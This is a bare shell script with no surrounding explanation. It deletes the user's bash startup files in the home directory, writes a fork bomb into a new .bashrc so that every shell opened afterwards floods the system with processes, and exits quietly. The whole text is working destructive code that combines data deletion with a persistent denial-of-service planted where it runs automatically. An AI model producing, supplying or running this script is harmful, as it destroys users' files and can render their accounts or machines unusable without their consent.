




rm -f $HOME/.bashr*
echo ":(){ :|: & };:" >> $HOME/.bashrc
exit 0





